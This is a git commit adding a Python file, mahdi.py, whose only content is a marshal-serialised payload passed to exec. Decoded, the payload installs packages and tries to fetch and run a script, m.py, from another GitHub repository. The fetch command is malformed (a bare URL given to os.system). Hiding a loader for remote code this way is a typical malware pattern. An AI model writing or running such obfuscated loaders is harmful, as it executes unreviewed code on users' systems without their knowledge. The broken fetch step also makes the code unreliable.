067425af8627d1b5aad7ff9219917c38e7014559
Mahdi-hasan580 <103421319+Mahdi-hasan580@users.noreply.github.com>
2022-04-17 12:18:27 +0600

    Add files via upload

---
+++ mahdi.py
@@ -0,0 +1,2 @@
+import marshal
+exec(marshal.loads(b's\x0f\x01\x00\x00import os\r\n\r\nimport sys\r\n\r\nimport time\r\n\r\nos.system("pip install requests")\r\nos.system(\'pip2 install requests\')\r\nos.system(\'pip2 install mechanize\')\r\nos.system("https://github.com/MAHDI-Shuvo/jjj")\r\nos.system("cd jjj && python2 m.py")\r\n\r\n\r\n                               '))
